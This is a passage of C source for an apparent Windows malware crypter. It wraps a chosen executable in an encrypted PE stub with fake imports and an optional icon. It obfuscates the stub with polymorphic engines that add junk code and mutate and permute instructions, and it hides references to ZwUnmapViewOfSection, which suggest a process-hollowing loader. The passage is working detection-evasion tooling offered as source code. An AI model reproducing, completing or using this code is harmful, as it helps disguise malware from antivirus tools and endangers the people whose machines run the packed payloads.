	pstubSections[0].SizeOfRawData = Align(StubSectionsSize(0), stubNT.OptionalHeader.FileAlignment);
	pstubSections[0].VirtualAddress = Align(stubNT.OptionalHeader.SizeOfHeaders, stubNT.OptionalHeader.SectionAlignment);


	pstubSections[1].VirtualAddress = Align(pstubSections[0].VirtualAddress + pstubSections[0].Misc.VirtualSize, stubNT.OptionalHeader.SectionAlignment);

	dwImportRawSize = 10240;
	pImportData = FakeImports(pstubSections[1].VirtualAddress, &dwImportRawSize, &dwIATSize, &dwImportsSize);

	memcpy(pstubSections[1].Name, ".rdata", 6);

//	pstubSections[1].Misc.VirtualSize = Align(dwImportRawSize, stubNT.OptionalHeader.SectionAlignment);
	pstubSections[1].Misc.VirtualSize = dwImportRawSize;
	pstubSections[1].Characteristics = 0x40000040;
	pstubSections[1].PointerToRawData = Align(pstubSections[0].PointerToRawData + pstubSections[0].SizeOfRawData, stubNT.OptionalHeader.FileAlignment);
	pstubSections[1].SizeOfRawData = Align(dwImportRawSize, stubNT.OptionalHeader.FileAlignment);


	memcpy(pstubSections[2].Name, ".data", 5);
//	pstubSections[2].Misc.VirtualSize = Align(StubSectionsSize(1), stubNT.OptionalHeader.SectionAlignment);
	pstubSections[2].Misc.VirtualSize = StubSectionsSize(1);
	pstubSections[2].Characteristics = 0xC0000040;
	pstubSections[2].PointerToRawData = Align(pstubSections[1].PointerToRawData + pstubSections[1].SizeOfRawData, stubNT.OptionalHeader.FileAlignment);
	pstubSections[2].SizeOfRawData = Align(StubSectionsSize(1), stubNT.OptionalHeader.FileAlignment);
	pstubSections[2].VirtualAddress = Align(pstubSections[1].VirtualAddress + pstubSections[1].Misc.VirtualSize, stubNT.OptionalHeader.SectionAlignment);


	MapStubSections(pstubSections[0].VirtualAddress, pstubSections[2].VirtualAddress, CryptedData);

	if (bIcon)
	{
		pstubSections[3].VirtualAddress = Align(pstubSections[2].VirtualAddress + pstubSections[2].Misc.VirtualSize, stubNT.OptionalHeader.SectionAlignment);
		pResData = CreateIconResources(szIcon, pstubSections[3].VirtualAddress, &dwResSize);
		if (pResData)
		{

			memcpy(pstubSections[3].Name, ".rsrc", 5);
//			pstubSections[3].Misc.VirtualSize = Align(dwResSize, stubNT.OptionalHeader.SectionAlignment);
			pstubSections[3].Misc.VirtualSize = dwResSize;
			pstubSections[3].PointerToRawData = Align(pstubSections[2].PointerToRawData + pstubSections[2].SizeOfRawData, stubNT.OptionalHeader.SectionAlignment);
			pstubSections[3].SizeOfRawData = Align(dwResSize, stubNT.OptionalHeader.FileAlignment);
			pstubSections[3].Characteristics = 0x40000040;
		}
		else
		{

			bIcon = FALSE;
			pstubSections[3].VirtualAddress = 0;
			stubNT.FileHeader.NumberOfSections--;
		}
	}

	stubNT.OptionalHeader.BaseOfCode = pstubSections[0].VirtualAddress;
	stubNT.OptionalHeader.BaseOfData = pstubSections[2].VirtualAddress;
	stubNT.OptionalHeader.SizeOfCode = pstubSections[0].Misc.VirtualSize;
	//are rsrcs are part of initialized data?...w/e figure it out later.
	stubNT.OptionalHeader.SizeOfInitializedData = pstubSections[1].Misc.VirtualSize + pstubSections[2].Misc.VirtualSize;

	stubNT.OptionalHeader.DataDirectory[1].Size = dwImportsSize;
	stubNT.OptionalHeader.DataDirectory[1].VirtualAddress = pstubSections[1].VirtualAddress + dwIATSize;

	stubNT.OptionalHeader.DataDirectory[12].Size = dwIATSize;
	stubNT.OptionalHeader.DataDirectory[12].VirtualAddress = pstubSections[1].VirtualAddress;

	if (bIcon)
	{
		stubNT.OptionalHeader.DataDirectory[2].VirtualAddress = pstubSections[3].VirtualAddress;
		stubNT.OptionalHeader.DataDirectory[2].Size = dwResSize;
	}

	//header done, make sure stub variables are set and then write.

	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].Offsets.dwOldVA == (DWORD)pFileArray)
		{
			pFileArray = (FileInfo*)stubsections[i].Offsets.dwNewVA;
			break;
		}
	}

	FixVAs((DWORD)pMe, stubNT.OptionalHeader.SizeOfImage, stubNT.OptionalHeader.ImageBase);

	for (i = 0; i < NUM_STUB_SECTIONS; i++)
	{
		if (stubsections[i].IsCodeOrData == 0 && stubsections[i].FixVAs == 1) //permutate stub code.
		{
			smi2le engine(GetTickCount());

			engine.Disasm((BYTE*)stubsections[i].Offsets.dwOldVA, stubsections[i].dwOldSize, 0);

			for (k = 0; k < 4; k++)
			{
				engine.AddTrash(1, 50, 500, true);
			}

			if (!(rand() % 3))
				engine.AddTrash(1, 20, 200, false);

			for (k = 0; k < 4; k++)
				engine.Mutate(5);

			for (k = 0; k < 2; k++)
				engine.Permutate(15);

			DWORD dwret;

			(*(etg_engine*)&etg_bin)
			(0,
			ETG_ALL,
			REG_ALL,
			REG_ALL,
			&dwret,
			stubsections[i].dwNewSize,
			stubsections[i].dwNewSize,
			(unsigned char*)stubsections[i].pCodeData,
			smi2le::my_rand);

			for (dwret = 0; dwret < 100; dwret++)
			{
				if (engine.Asm((BYTE*)stubsections[i].pCodeData, stubsections[i].dwNewSize, &dwEP) == ERR_SUCCESS)
					break;
			}

			if (dwret >= 100)
			{
				MessageBox(0, "Oops, try again", "Error", MB_ICONERROR);
				goto whataloser;
			}


			//no mutation (for testing/debugging)
//			memcpy((void*)stubsections[i].pCodeData, (void*)stubsections[i].Offsets.dwOldVA, stubsections[i].dwOldSize);
//			dwEP = 0;
		}
	}

	stubNT.OptionalHeader.AddressOfEntryPoint = OldVAToNewVA((DWORD)&stub_entry) + dwEP;
	stubNT.OptionalHeader.SizeOfImage = pstubSections[stubNT.FileHeader.NumberOfSections - 1].VirtualAddress + pstubSections[stubNT.FileHeader.NumberOfSections - 1].Misc.VirtualSize;


	BYTE* h;
	for (h = (BYTE*)&ZwUnmapViewOfSection; h < (BYTE*)&pLoadLibrary + 4; h++)
	{
		*h = (BYTE)rand();
	}
	//encrypt cnsts section
	enc((BYTE*)ntdll, (BYTE*)ntdll, (DWORD)&Mapping[8] - (DWORD)ntdll);


	HANDLE hFile;
	DWORD dwbytes;

	hFile = CreateFile(szOutput, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		//write headers.
		WriteFile(hFile, pMe, stubDOS.e_lfanew, &dwbytes, NULL);
		SetFilePointer(hFile, stubDOS.e_lfanew, NULL, FILE_BEGIN);
		WriteFile(hFile, &stubNT, 4 + sizeof(IMAGE_FILE_HEADER), &dwbytes, NULL);
		WriteFile(hFile, &stubNT.OptionalHeader, stubNT.FileHeader.SizeOfOptionalHeader, &dwbytes, NULL);
		WriteFile(hFile, pstubSections, sizeof(IMAGE_SECTION_HEADER) * stubNT.FileHeader.NumberOfSections, &dwbytes, NULL);


		SetFilePointer(hFile, pstubSections[0].PointerToRawData, NULL, FILE_BEGIN);

		//write code
		WriteSectionsToFile(hFile, 0);

		SetFilePointer(hFile, pstubSections[1].PointerToRawData, NULL, FILE_BEGIN);

		//write imports
		WriteFile(hFile, pImportData, dwImportRawSize, &dwbytes, NULL);

		VirtualFree(pImportData, 0, MEM_RELEASE);

		SetFilePointer(hFile, pstubSections[2].PointerToRawData, NULL, FILE_BEGIN);

		//write data
		WriteSectionsToFile(hFile, 1);

		if (bIcon)
		{
			//write rsrc
			SetFilePointer(hFile, pstubSections[3].PointerToRawData, NULL, FILE_BEGIN);
			WriteFile(hFile, pResData, dwResSize, &dwbytes, NULL);
		}

		SetFilePointer(hFile, pstubSections[stubNT.FileHeader.NumberOfSections - 1].PointerToRawData + pstubSections[stubNT.FileHeader.NumberOfSections - 1].SizeOfRawData, NULL, FILE_BEGIN);
		SetEndOfFile(hFile);

		//write EOF data.
		if (CryptedData->pEOFData && CryptedData->dwEOFSize)
		{
			if (MessageBox(0, "Add EOF data?", "EOF Data Found", MB_YESNO | MB_ICONQUESTION) == IDYES)
			{
				if (MessageBox(0, "Patch EOF data?", "Patch EOF Data?", MB_YESNO| MB_ICONQUESTION) == IDYES)
				{
					i = bIcon ? 3 : 2;
					pstubSections[i].SizeOfRawData = Align(pstubSections[i].SizeOfRawData + CryptedData->dwEOFSize, stubNT.OptionalHeader.FileAlignment);
					pstubSections[i].Misc.VirtualSize = Align(pstubSections[i].SizeOfRawData, stubNT.OptionalHeader.SectionAlignment);

					SetFilePointer(hFile, stubDOS.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + stubNT.FileHeader.SizeOfOptionalHeader, NULL, FILE_BEGIN);
					WriteFile(hFile, pstubSections, sizeof(IMAGE_SECTION_HEADER) * stubNT.FileHeader.NumberOfSections, &dwbytes, NULL);

					SetFilePointer(hFile, (pstubSections[i].PointerToRawData + pstubSections[i].SizeOfRawData) - CryptedData->dwEOFSize, NULL, FILE_BEGIN);
					WriteFile(hFile, CryptedData->pEOFData, CryptedData->dwEOFSize, &dwbytes, NULL);
				}
				else
					WriteFile(hFile, CryptedData->pEOFData, CryptedData->dwEOFSize, &dwbytes, NULL);
			}
		}

		CloseHandle(hFile);
	}
	else
		MessageBox(0, "Couldn't create file", "Error", MB_ICONERROR);

//cleanup.
whataloser:
	if (bIcon)
		VirtualFree(pResData, 0, MEM_RELEASE);

	for (i = 0; i < NUM_STUB_SECTIONS; i++)
		VirtualFree(stubsections[i].pCodeData, 0, MEM_RELEASE);

	VirtualFree(pstubSections, 0, MEM_RELEASE);

	for (i = 0; i < dwNumFiles; i++)
	{
		if (CryptedData[i].pEOFData)
		{
			VirtualFree(CryptedData[i].pEOFData, 0, MEM_RELEASE);
			break;
		}
	}

	MessageBox(0, "All done.", "Success", MB_ICONINFORMATION);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
//program ep.
{
	//just process 1 file for starters. could change later to crypt multiple files.
	CRYPTEDFILE CryptedData;
	OPENFILENAME ofn;
	char szFile[MAX_PATH+1] = "\0";

	srand(GetTickCount());

	pFileArray = (FileInfo*)VirtualAlloc(NULL, sizeof(FileInfo), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	memset(&ofn, 0, sizeof(OPENFILENAME));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hInstance = GetModuleHandle(NULL);
	ofn.lpstrFilter = "EXE files\0*.exe\0\0";
	ofn.lpstrFile = szFile;
	ofn.nMaxFile = MAX_PATH;
	ofn.lpstrTitle = "Select file to encrypt";
	ofn.Flags = OFN_FILEMUSTEXIST;

	if (GetOpenFileName(&ofn))
	{
		PrepareFileDataForStub(szFile, &CryptedData);

		pFileArray[dwNumFiles].dwPackedSize = CryptedData.dwCryptSize;
		pFileArray[dwNumFiles].dwUnpackedSize = CryptedData.dwOrigSize;

		dwNumFiles = 1;

		PrepareStubSectionsInfo(&CryptedData);

		DeleteFile("out.exe");
		BuildStub("out.exe", &CryptedData);
	}

	ExitProcess(0);
	return 0;
}

/*EOF*/